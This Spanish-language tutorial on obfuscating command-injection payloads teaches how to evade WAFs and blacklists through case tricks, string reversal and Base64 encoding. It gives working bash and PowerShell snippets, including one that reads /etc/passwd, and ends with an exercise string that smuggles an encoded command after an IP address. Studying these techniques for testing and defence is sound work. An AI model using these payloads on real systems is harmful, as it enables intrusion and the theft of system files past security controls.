
---
# **Ofuscación Avanzada de Comandos en Inyección de Comandos**

Cuando nos enfrentamos a **WAFs (Web Application Firewalls)** o filtros más sofisticados, las técnicas básicas de evasión pueden fallar. En estos casos, podemos utilizar técnicas avanzadas de **ofuscación de comandos** para ejecutar nuestras órdenes sin ser detectados.

---

## **1. Manipulación de Mayúsculas y Minúsculas**

Algunas listas negras en filtros **no consideran las variaciones en mayúsculas y minúsculas**, por lo que podemos modificar el comando.

### **Ejemplo en Windows (CMD y PowerShell son insensibles a mayúsculas)**

```powershell
WhOaMi
```

Salida esperada:

```
user
```

### **Ejemplo en Linux (requiere conversión a minúsculas)**

Linux es **sensible a mayúsculas**, por lo que podemos utilizar `tr` para transformar el comando:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Salida esperada:

```
user
```

Para evitar filtros de espacios, podemos reemplazar los espacios con `%09` (tabulaciones).

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Prueba en la aplicación reemplazando espacios según las técnicas previas.

---

## **2. Reversión de Comandos**

Podemos escribir el comando **al revés** y luego revertirlo en tiempo de ejecución.

### **Ejemplo en Linux**

```bash
echo 'whoami' | rev
```

Salida esperada:

```
imaohw
```

Ejecutando el comando revertido:

```bash
$(rev<<<'imaohw')
```

Salida:

```
user
```

### **Ejemplo en Windows PowerShell**

```powershell
"whoami"[-1..-20] -join ''
```

Salida esperada:

```
imaohw
```

Ejecutando el comando revertido:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

Salida:

```
user
```

Esta técnica permite evadir filtros que buscan palabras específicas.

---

## **3. Comandos Codificados**

Codificar el comando en **Base64** u otro formato ayuda a evitar detección por filtros que analizan patrones en texto plano.

### **Ejemplo en Linux (Base64)**

Codificamos el comando:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

Salida:

```
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Lo ejecutamos decodificando en `bash`:

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Salida:

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Se evitó el uso de `|` con `<<<`.

### **Ejemplo en Windows (Base64)**

Codificamos el comando:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Salida:

```
dwBoAG8AYQBtAGkA
```

Ejecutamos el comando decodificado:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Salida:

```
user
```

Si `bash` o `base64` están bloqueados, podemos usar `openssl` para la decodificación.

---

## **4. Otras Técnicas de Evasión**

- **Uso de caracteres comodín (`*`, `?`)** para evitar filtros exactos.
- **Expansión de enteros** (`echo $((65+32))` → imprime `97`, que equivale a `a`).
- **Redirección de salida (`>`, `>>`, `<`)** para alterar la forma en que los datos son interpretados.

Para más técnicas, consultar **PayloadsAllTheThings**.

---

## **Conclusión**

- **Ofuscación avanzada** es clave para evadir filtros sofisticados.
- **Combinación de técnicas** (case manipulation, reversal, encoding) mejora la efectividad.
- **Automatización con herramientas** de ofuscación puede facilitar la explotación.

Estas estrategias permiten ejecutar comandos **evitando listas negras y WAFs avanzados**.

### Ejercicio
127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)